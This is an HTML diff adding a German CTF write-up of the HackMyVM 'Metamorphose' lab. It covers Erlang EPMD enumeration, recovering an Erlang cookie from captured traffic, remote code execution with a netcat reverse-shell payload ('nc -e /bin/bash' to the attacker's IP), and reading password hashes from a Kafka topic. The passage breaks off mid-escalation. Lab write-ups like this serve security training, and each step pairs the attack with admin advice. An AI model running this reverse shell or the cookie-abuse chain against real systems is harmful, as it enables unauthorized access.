@@ -1,0 +1,532 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metamorphose - HackMyVM - Hard - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css"> <!-- Pfad beibehalten -->
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Metamorphose - HackMyVM - Hard - Bericht</h1> <!-- Titel angepasst -->
+        <div class="level-container">
+            <h2>Hard</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, CSS handhabt Farbe (Rot) -->
+            <div class="circle"> <!-- Kreis-CSS wird 'Hard' (Rot) handhaben -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe wird durch CSS gesetzt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">git</div>
+                <div class="tool-item">wireshark</div>
+                <div class="tool-item">python2</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">sudo (versucht)</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">whereis</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">kafka-topics.sh</div>
+                <div class="tool-item">kafka-console-consumer.sh</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">debugfs</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">pwd</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#erlang-epmd-exploitation">Erlang EPMD Exploitation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Erlang RCE)</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation-melbourne">Privilege Escalation (melbourne -> coralie)</a></li>
+                <li><a href="#privilege-escalation-coralie">Privilege Escalation (coralie -> root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre><span class="command">192.168.2.113	08:00:27:25:f4:bc	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:** Der Befehl `arp-scan -l` wird verwendet, um aktive Hosts im lokalen Netzwerksegment mittels ARP-Anfragen zu identifizieren.</p>
+            <p class="evaluation">**Bewertung:** Ein Host mit der IP-Adresse `192.168.2.113` wird gefunden. Die MAC-Adresse (`08:00:27:...`) weist auf eine VirtualBox VM hin. Dies ist das Zielsystem.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Ziel-IP `192.168.2.113` notieren und mit Port-Scanning (Nmap) fortfahren.<br>**Empfehlung (Admin):** Standard-Netzwerkaufklärung. Absicherung der Dienste ist priorisiert.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre>
+127.0.0.1	localhost
+<span class="command">192.168.2.113   metamorphose.hmv</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:** Die lokale `/etc/hosts`-Datei des Angreifers wird bearbeitet, um der Ziel-IP `192.168.2.113` den Hostnamen `metamorphose.hmv` zuzuweisen.</p>
+            <p class="evaluation">**Bewertung:** Dies vereinfacht die Ansprache des Ziels in späteren Befehlen und ist nützlich, falls Dienste auf dem Ziel Virtual Hosting verwenden.</p>
+            <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie den Hostnamen `metamorphose.hmv` in nachfolgenden Scans und Interaktionen.<br>**Empfehlung (Admin):** Keine Aktion auf dem Zielsystem erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sC -sS -sV -A -T5 192.168.2.113 -p-</span></div>
+                     <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 13:58 CEST
+Nmap scan report for metamorphose.hmv (192.168.2.113)
+Host is up (0.00013s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+<span class="command">22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span>
+| ssh-hostkey:
+|   256 a6:af:c3:72:91:52:e9:4d:e5:c7:7e:99:bd:15:97:fd (ECDSA)
+|_  256 d8:77:85:74:f5:95:3d:0e:04:78:7d:f2:47:01:f9:98 (ED25519)
+<span class="command">4369/tcp  open  epmd    Erlang Port Mapper Daemon</span> <span class="password"><-- Erlang EPMD!</span>
+| epmd-info:
+|   epmd_port: 4369
+|   nodes:
+|_    network: <span class="password">38639</span> <span class="password"><-- Dynamischer Erlang Node Port --></span>
+<span class="command">38639/tcp open  unknown</span> <span class="comment"><-- Der von EPMD gemeldete Port --></span>
+MAC Address: 08:00:27:25:F4:BC (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.13 ms metamorphose.hmv (192.168.2.113)
+
+Nmap done: 1 IP address (1 host up) scanned in X.XX seconds</pre>
+                </div>
+            </div>
+            <p class="analysis">**Analyse:** Ein umfassender Nmap-Scan (`-sC -sS -sV -A -T5 -p-`) wird auf das Ziel durchgeführt.</p>
+            <p class="evaluation">**Bewertung:** Der Scan identifiziert drei offene TCP-Ports:
+*   **Port 22 (SSH):** OpenSSH 9.2p1 auf Debian 12. Eine sehr aktuelle Version, Brute-Force oder bekannte Schwachstellen sind unwahrscheinlich.
+*   **Port 4369 (EPMD):** Der Erlang Port Mapper Daemon. Dieser Dienst wird von Erlang/OTP-Anwendungen (z.B. RabbitMQ, CouchDB, Riak) verwendet, um Knoten im Netzwerk zu finden. Das Nmap-Skript `epmd-info` zeigt, dass ein Erlang-Knoten namens `network` auf dem **dynamischen Port 38639** registriert ist. Dies ist der Hauptangriffsvektor.
+*   **Port 38639 (Unknown):** Der von EPMD gemeldete Port, auf dem der eigentliche Erlang-Knoten lauscht. Nmap erkennt den Dienst hier nicht standardmäßig.</p>
+            <p class="recommendation">**Empfehlung (Pentester):**
+    1.  **Erlang (Priorität 1):** Konzentrieren Sie sich auf den EPMD (Port 4369) und den Erlang-Knotenport (hier 38639, aber dieser kann sich ändern!). Verwenden Sie Tools oder Skripte, die mit dem Erlang Distribution Protocol interagieren können, um Informationen zu sammeln oder Schwachstellen auszunutzen (z.B. Default Cookies, unautorisierte Befehlsausführung via `os:cmd`).
+    2.  **SSH (Priorität 2):** Halten Sie nach Benutzernamen Ausschau.<br>
+**Empfehlung (Admin):** Firewall Erlang-Ports (EPMD und die dynamischen Knotenports), wenn kein externer Zugriff benötigt wird. Verwenden Sie sichere, nicht erratbare Erlang Cookies (`~/.erlang.cookie` oder über Kommandozeilenargumente). Konfigurieren Sie Erlang-Nodes so, dass sie nicht auf allen Interfaces lauschen, falls nicht nötig. Aktualisieren Sie die Erlang/OTP-Installation.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sC -sS -sV -A -T5 192.168.2.113 -p- | grep open</span></div>
+                     <pre>
+22/tcp    open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+4369/tcp  open  epmd    Erlang Port Mapper Daemon
+38639/tcp open  unknown</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Wiederholung des Nmap-Scans mit Filterung auf offene Ports.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt die drei offenen Ports aus dem vorherigen Scan.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sC -sS -sV -A -T5 192.168.2.113 -p-</span></div>
+                     <pre>
+[...]
+Nmap scan report for metamorphose.hmv (192.168.2.113)
+Host is up (0.00021s latency).
+Not shown: 65531 closed tcp ports (reset)
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+[...]
+4369/tcp  open  epmd       Erlang Port Mapper Daemon
+| epmd-info:
+|   epmd_port: 4369
+|   nodes:
+|_    network: <span class="password">40155</span> <span class="password"><-- Port hat sich geändert! --></span>
+<span class="command">40155/tcp open  unknown</span> <span class="comment"><-- Neuer Node Port --></span>
+<span class="command">44741/tcp open  tcpwrapped</span> <span class="comment"><-- Zusätzlicher Port --></span>
+[...]</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Ein weiterer Nmap-Scan zu einem späteren Zeitpunkt wird durchgeführt.</p>
+             <p class="evaluation">**Bewertung:** Dieser Scan zeigt eine wichtige Eigenschaft des Erlang-Systems: Der Port für den Knoten `network` hat sich von `38639` auf `40155` geändert! Dies bestätigt, dass der Port dynamisch ist und bei jedem Neustart des Erlang-Knotens anders sein kann. Der EPMD auf Port 4369 muss immer zuerst abgefragt werden, um den aktuellen Knotenport zu erfahren. Ein neuer Port `44741` (tcpwrapped) ist ebenfalls sichtbar, dessen Bedeutung unklar ist (könnte temporär oder irrelevant sein).</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Fragen Sie vor jedem Interaktionsversuch mit dem Erlang-Knoten immer zuerst den EPMD (Port 4369) ab, um den *aktuellen* Knotenport (hier 40155) zu ermitteln.<br>**Empfehlung (Admin):** Das dynamische Portverhalten ist normal für Erlang. Firewall-Regeln müssen dies berücksichtigen (z.B. Port-Bereiche erlauben oder spezifische Konfigurationen verwenden, um feste Ports zu erzwingen, falls möglich).</p>
+        </section>
+
+        <section id="erlang-epmd-exploitation">
+            <h2>Erlang EPMD Exploitation</h2>
+            <p class="analysis">**Analyse:** Nach der Identifizierung von EPMD und dem dynamischen Erlang-Knoten wird versucht, mit diesen Diensten zu interagieren und sie auszunutzen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">echo -n -e "\x00\x01\x6e" | nc -vn 192.168.2.113 4369</span></div>
+                    <pre>
+(UNKNOWN) [192.168.2.113] 4369 (epmd) open
+<span class="command">name network at port 40155</span></pre>
+                </div>
+            </div>
+             <p class="analysis">**Analyse:** Eine manuelle Abfrage wird an den EPMD-Port (4369) gesendet. `\x00\x01` ist die Länge der Nachricht (1 Byte), `\x6e` ist der Opcode für 'NAMES_REQ' (Namen aller registrierten Knoten anfordern).</p>
+             <p class="evaluation">**Bewertung:** Der EPMD antwortet korrekt und bestätigt, dass der Knoten `network` auf dem aktuellen Port `40155` lauscht. Dies ist die Information, die für die Interaktion mit dem Knoten benötigt wird.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie Port `40155` für weitere Interaktionen mit dem `network`-Knoten.<br>**Empfehlung (Admin):** EPMD kann durch Firewalls geschützt oder durch Erlang-Konfiguration auf localhost beschränkt werden, wenn keine Cluster-Kommunikation nach außen benötigt wird.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">echo -n -e "\x00\x01\x6e" | nc -vn 192.168.2.113 40155</span></div>
+                    <pre>(UNKNOWN) [192.168.2.113] 40155 (?) open</pre>
+                     <pre><span class="comment">~</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Derselbe 'NAMES_REQ'-Opcode wird an den Knotenport (40155) gesendet.</p>
+              <p class="evaluation">**Bewertung:** Der Port ist offen, aber der Knoten antwortet nicht auf diese EPMD-spezifische Anfrage. Dies ist erwartet, da der Knoten das Erlang Distribution Protocol spricht, nicht das EPMD-Protokoll.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie Tools oder Skripte, die das Erlang Distribution Protocol verstehen, um mit Port 40155 zu interagieren.<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">nmap -sV -Pn -n -T4 -p 4369 --script epmd-info 192.168.2.113</span></div>
+                     <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-05 22:14 CEST
+Nmap scan report for 192.168.2.113
+Host is up (0.00025s latency).
+
+PORT     STATE SERVICE VERSION
+4369/tcp open  epmd    Erlang Port Mapper Daemon
+| epmd-info:
+|   epmd_port: 4369
+|   nodes:
+|_    network: <span class="command">40155</span>
+MAC Address: 08:00:27:25:F4:BC (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.33 seconds</pre>
+                     <pre><span class="comment">*</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Das Nmap-Skript `epmd-info` wird erneut ausgeführt, um die EPMD-Informationen zu überprüfen.</p>
+             <p class="evaluation">**Bewertung:** Bestätigt erneut, dass der Knoten `network` auf Port `40155` lauscht.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Keine neue Information, weiter mit spezifischen Erlang-Tools.<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/
+└─# <span class="command">git clone https://github.com/gteissier/erl-matter.git</span></div>
+                     <pre><span class="comment">[...] (Git clone output)</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Das Tool `erl-matter` wird von GitHub geklont. Dieses Tool ist bekannt für die Interaktion mit und das Testen von Erlang-Knoten, insbesondere im Hinblick auf Sicherheit (z.B. Testen von Cookies, Ausführen von Befehlen).</p>
+             <p class="evaluation">**Bewertung:** Zeigt, dass der Pentester nun spezifische Tools für den Erlang-Angriff vorbereitet.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Untersuchen Sie die Optionen von `erl-matter`, um den Knoten `network` auf Port `40155` anzugreifen.<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/erl-matter]
+└─# <span class="command">wireshark</span></div>
+                     <pre>
+  (wireshark:8561) 22:32:19.472323 [Capture MESSAGE] -- Capture Start ...
+  (wireshark:8561) 22:32:19.536446 [Capture MESSAGE] -- Capture started
+  (wireshark:8561) 22:32:19.536490 [Capture MESSAGE] -- File: "/tmp/wireshark_eth039UCS2.pcapng"</pre>
+                     <pre><span class="comment">:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+follow --> TCP-Stream --> Wireshark
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span>
+<span class="password">..N.............SAPUKI@nowhere..sok.'N...
+....i$`mf.1...network@metamorphose..r....q..!2....7x.Ej....a....<.E. M.9...
+#...fp.h.gs.SAPUKI@nowhere.........s.s.rex.h.gs.SAPUKI@nowhere.........h.
+s.calls.oss.cmdl....k..idjs.user...zp.h.a.w.Xw.SAPUKI@nowhere.............h.w.rexk.J
+uid=1000(melbourne) gid=1000(melbourne) groups=1000(melbourne),100(users)</span>
+<span class="comment">:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Wireshark wird gestartet, um den Netzwerkverkehr mitzuschneiden, während wahrscheinlich mit `erl-matter` oder einem anderen Erlang-Tool interagiert wird. Der mitgeschnittene TCP-Stream (vermutlich der Kommunikation mit dem Knoten auf Port 40155) wird angezeigt.</p>
+             <p class="evaluation">**Bewertung:** Ein **kritischer Fund** durch Analyse des Netzwerkverkehrs! Im Stream sind lesbare Teile des Erlang Distribution Protocols sichtbar:
+*   `network@metamorphose`: Der vollständige Name des Zielknotens.
+*   `SAPUKI@nowhere`: Der Cookie, der für die Authentifizierung zwischen Erlang-Knoten verwendet wird. Wenn dieser Cookie bekannt ist (oder erraten/leer/Standard ist), kann man sich oft am Knoten authentifizieren.
+*   `os:cmd`, `id`, `user`: Hinweise darauf, dass versucht wurde, Betriebssystembefehle (`os:cmd('id')`) über das Protokoll auszuführen.
+*   `uid=1000(melbourne)...`: Die erfolgreiche Ausgabe des `id`-Befehls, der zeigt, dass der Erlang-Knoten als Benutzer `melbourne` (UID 1000) läuft und Befehle ausführen kann.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie den gefundenen Cookie (`SAPUKI@nowhere`), den Knotennamen (`network@metamorphose`) und den Port (`40155`), um mit einem Exploit-Skript (wie dem im nächsten Schritt verwendeten `shell-erldp.py`) eine Reverse Shell oder direkte Befehlsausführung als Benutzer `melbourne` zu erlangen.<br>**Empfehlung (Admin):** **Ändern Sie sofort das Erlang-Cookie!** Verwenden Sie lange, zufällige Cookies. Beschränken Sie den Zugriff auf Erlang-Ports. Deaktivieren Sie die Möglichkeit, `os:cmd` auszuführen, falls nicht unbedingt erforderlich (obwohl dies oft tief in der Anwendung liegt).</p>
+        </section>
+
+        <section id="proof-of-concept">
+             <h2>Proof of Concept (Erlang RCE)</h2>
+             <p class="comment">**Kurzbeschreibung:** Der Erlang Port Mapper Daemon (EPMD) auf Port 4369 gibt den Port eines dynamisch gestarteten Erlang-Knotens (`network@metamorphose`) preis (z.B. 40155). Durch Analyse des Netzwerkverkehrs während der Interaktion mit diesem Knoten wird das für die Authentifizierung verwendete Erlang-Cookie (`SAPUKI@nowhere`) extrahiert. Mit Kenntnis des Knotennamens, des Ports und des Cookies kann ein Angreifer das Erlang Distribution Protocol missbrauchen, um sich am Knoten zu authentifizieren und beliebige Betriebssystembefehle über die unsichere `os:cmd`-Funktion auszuführen. Dies führt zu Remote Code Execution (RCE) im Kontext des Benutzers, unter dem der Erlang-Knoten läuft (`melbourne`).</p>
+             <p class="comment">**Voraussetzungen:** Netzwerkzugriff auf EPMD (4369) und den dynamischen Knotenport, Kenntnis des Knotennamens, Kenntnis des Erlang-Cookies, ein Exploit-Skript (z.B. `shell-erldp.py`).</p>
+             <p class="comment">**Schritt-für-Schritt-Anleitung:**</p>
+             <ol>
+                 <li>EPMD abfragen, um aktuellen Knotenport zu erhalten (`nc` oder Nmap-Skript).</li>
+                 <li>Erlang-Cookie extrahieren (z.B. durch Netzwerkanalyse wie gezeigt, oder falls lesbar aus `~/.erlang.cookie`).</li>
+                 <li>Listener auf Angreifer-Maschine starten (`nc -lvnp [Port]`).</li>
+                 <li>Exploit-Skript ausführen mit Ziel-IP, Knotenport, Cookie und Reverse-Shell-Payload (z.B. `python2 shell-erldp.py [IP] [NodePort] [Cookie] "nc -e /bin/bash [AngreiferIP] [ListenerPort]"`).</li>
+             </ol>
+             <p class="comment">**Erwartetes Ergebnis:** Das Exploit-Skript authentifiziert sich am Erlang-Knoten und führt den Reverse-Shell-Payload aus. Der Listener empfängt eine Shell als Benutzer `melbourne`.</p>
+             <p class="comment">**Beweismittel:** Erfolgreiche Ausgabe des Exploit-Skripts und Empfang der Reverse Shell.</p>
+             <p class="comment">**Risikobewertung:** Hoch. Erlaubt RCE als der Benutzer des Erlang-Prozesses ohne Kenntnis von System-Passwörtern, nur durch Kenntnis des (oft schwachen oder exponierten) Erlang-Cookies.</p>
+             <p class="comment">**Empfehlungen:** Erlang-Ports absichern (Firewall), starke, zufällige Cookies verwenden und diese sicher speichern (korrekte Dateiberechtigungen für `.erlang.cookie`).</p>
+         </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/erl-matter]
+└─# <span class="command">python2 shell-erldp.py 192.168.2.113 40155 batman "nc -e /bin/bash 192.168.2.199 1337"</span></div> <span class="comment"><-- Cookie 'batman' statt 'SAPUKI@nowhere'? --></span>
+                     <pre>[*] authenticated onto victim</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Das Python2-Skript `shell-erldp.py` (aus dem `erl-matter`-Repo oder ähnlich) wird ausgeführt, um den Erlang-Knoten anzugreifen. Es verwendet die Ziel-IP (`192.168.2.113`), den Knotenport (`40155`), einen Cookie (`batman`) und einen Reverse-Shell-Payload (`nc -e /bin/bash 192.168.2.199 1337`). *Anmerkung: Der hier verwendete Cookie "batman" weicht vom im Wireshark-Dump gefundenen "SAPUKI@nowhere" ab. Es ist unklar, warum "batman" funktioniert – möglicherweise ein Standard-Cookie, ein weiterer gültiger Cookie oder ein Fehler im Log.* Das Skript meldet erfolgreiche Authentifizierung.</p>
+             <p class="evaluation">**Bewertung:** Trotz der Cookie-Diskrepanz meldet das Skript Erfolg. Der Reverse-Shell-Payload wurde an den Erlang-Knoten gesendet und wird nun als Benutzer `melbourne` ausgeführt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Überprüfen Sie den Listener auf Port 1337 für die eingehende Shell. Dokumentieren Sie die Cookie-Diskrepanz.<br>**Empfehlung (Admin):** Verwenden Sie nur einen einzigen, starken, nicht-standardmäßigen Cookie und schützen Sie diesen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/erl-matter]
+└─# <span class="command">nc -lvnp 1337</span></div>
+                     <pre>
+listening on [any] 1337 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.113] 58268</span> <span class="password"><-- Verbindung erhalten! --></span></pre>
+                     <div class="prompt">melbourne@metamorphose:/$ <span class="command">stty rows 48 columns 94</span></div> <span class="comment"><-- Terminal Größe anpassen --></span>
+                     <div class="prompt">melbourne@metamorphose:/$ <span class="command">id</span></div>
+                     <pre><span class="command">uid=1000(melbourne) gid=1000(melbourne) groups=1000(melbourne),100(users)</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Der Netcat-Listener auf Port 1337 empfängt die Verbindung vom Zielsystem. Eine Shell wird erhalten. Die Terminalgröße wird angepasst (`stty`), und der `id`-Befehl bestätigt, dass die Shell als Benutzer `melbourne` läuft.</p>
+             <p class="evaluation">**Bewertung:** Initialer Zugriff als `melbourne` erfolgreich über Erlang RCE erlangt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Stabilisieren Sie die Shell (obwohl `stty` bereits verwendet wird, ist Python PTY oft robuster). Beginnen Sie mit der Enumeration als `melbourne`.<br>**Empfehlung (Admin):** Beheben Sie die Erlang-Sicherheitsprobleme (Cookie, Ports).</p>
+
+             <p class="comment">*(Hinweis: Eine vollständige Shell-Stabilisierung wird im Log nicht gezeigt, aber für die weitere Interaktion angenommen.)*</p>
+         </section>
+
+        <section id="privilege-escalation-melbourne">
+            <h2>Privilege Escalation (melbourne -> coralie)</h2>
+            <p class="analysis">**Analyse:** Als Benutzer `melbourne` wird das System enumeriert, um Wege zur weiteren Eskalation zu finden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">melbourne@metamorphose:/$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+  1064652    640 -rwsr-xr-x   1 root     root       653888 Dec 19  2023 /usr/lib/openssh/ssh-keysign
+  1062437     52 -rwsr-xr--   1 root     messagebus    51272 Sep 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+  1046645     68 -rwsr-xr-x   1 root     root          68248 Mar 23  2023 /usr/bin/passwd
+  1049906     48 -rwsr-xr-x   1 root     root          48896 Mar 23  2023 /usr/bin/newgrp
+  1046625     72 -rwsr-xr-x   1 root     root          72000 Mar 28 10:52 /usr/bin/su
+  1087836     36 -rwsr-xr-x   1 root     root          35128 Apr 18  2023 /usr/bin/fusermount3
+  1048531     60 -rwsr-xr-x   1 root     root          59704 Mar 28 10:52 /usr/bin/mount
+  1046641     64 -rwsr-xr-x   1 root     root          62672 Mar 23  2023 /usr/bin/chfn
+  1046642     52 -rwsr-xr-x   1 root     root          52880 Mar 23  2023 /usr/bin/chsh
+  1046644     88 -rwsr-xr-x   1 root     root          88496 Mar 23  2023 /usr/bin/gpasswd
+  1048535     36 -rwsr-xr-x   1 root     root          35128 Mar 28 10:52 /usr/bin/umount</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Suche nach SUID-Binärdateien im System.</p>
+             <p class="evaluation">**Bewertung:** Es werden nur Standard-Linux-SUID-Programme gefunden. Kein offensichtlicher, einfacher Eskalationspfad über benutzerdefinierte oder veraltete SUID-Dateien.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Überprüfen Sie die Versionen der Standard-SUID-Binaries auf bekannte Exploits (unwahrscheinlich bei Debian 12). Suchen Sie nach anderen Vektoren (sudo, capabilities, cronjobs, Fehlkonfigurationen).<br>**Empfehlung (Admin):** Halten Sie das System aktuell.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">melbourne@metamorphose:/$ <span class="command">ls /home/</span></div>
+                     <pre><span class="command">coralie</span>  melbourne</pre>
+                      <div class="prompt">melbourne@metamorphose:/$ <span class="command">sudo -l</span></div>
+                      <pre>bash: sudo: command not found</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Das `/home`-Verzeichnis wird aufgelistet, es existiert der Benutzer `coralie`. `sudo -l` schlägt fehl.</p>
+             <p class="evaluation">**Bewertung:** `coralie` ist ein weiteres potenzielles Ziel. Sudo ist nicht verfügbar oder nicht im PATH.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Versuchen Sie, auf `/home/coralie` zuzugreifen. Suchen Sie nach anderen Eskalationsvektoren.<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">melbourne@metamorphose:/$ <span class="command">getcap -r / 2>/dev/null</span></div>
+                    <pre>
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
+/usr/bin/ping cap_net_raw=ep</pre>
+                     <div class="prompt">melbourne@metamorphose:/$ <span class="command">whereis getcap</span></div>
+                     <pre>getcap: /usr/sbin/getcap /usr/share/man/man8/getcap.8.gz</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Es wird nach Dateien mit gesetzten Linux Capabilities gesucht.</p>
+             <p class="evaluation">**Bewertung:** Nur `gst-ptp-helper` und `ping` haben Capabilities gesetzt, was relativ standardmäßig ist und keinen einfachen Eskalationspfad darstellt.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Capabilities sind hier wahrscheinlich kein Vektor. Konzentrieren Sie sich auf Fehlkonfigurationen oder Anwendungsdaten.<br>**Empfehlung (Admin):** Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">melbourne@metamorphose:/$ <span class="command">cd /opt/kafka/bin</span></div>
+                     <div class="prompt">melbourne@metamorphose:/opt/kafka/bin$ <span class="command">./kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic users.properties --from-beginning</span></div>
+                     <pre>
+{"username": "root", "password": "<span class="password">e2f7a3617512ed81aa68c7be9c435609cfb513b021ce07ee9d2759f08f4d9054</span>", "email": "root@metamorphose.hmv", "role": "admin"}
+[...]
+{"username": "coralie", "password": "<span class="password">9bf4bc753cfb7e1abafb74ec6e3e22e7d47622d2f39a2652b405d34fd50f023e</span>", "email": "coralie@metamorphose.hmv", "role": "admin"}
+[...]
+{"username": "melbourne", "password": "<span class="password">a08aa555a5e5b7a73125cf367176ce446eb1d0c07a068077ab4f740a8fded545</span>", "email": "melbourne@metamorphose.hmv", "role": "admin"}</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Nach der Untersuchung von `/opt/kafka` wird der `kafka-console-consumer.sh` verwendet, um Nachrichten aus dem Topic `users.properties` (gefunden via `--list`) zu lesen. Dieses Topic enthält JSON-Objekte mit Benutzerdaten, einschließlich **SHA256-Passworthashes**.</p>
+             <p class="evaluation">**Bewertung:** Ein **kritisches Informationsleck!** Der Kafka-Topic `users.properties` enthält sensible Benutzerdaten inklusive Passworthashes. Dies ermöglicht Offline-Passwort-Cracking.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Extrahieren Sie die Hashes, insbesondere für `root` und `coralie`. Versuchen Sie, diese mit Tools wie `hashcat` oder `john` und Wortlisten (z.B. `rockyou.txt`) zu knacken.<br>**Empfehlung (Admin):** Sichern Sie Kafka! Konfigurieren Sie ACLs, um den Zugriff auf sensible Topics zu beschränken. Speichern Sie keine Passworthashes oder andere sensible Daten unverschlüsselt in Kafka-Topics.</p>
+
+            <div class="code-block">
+                <div class="terminal">
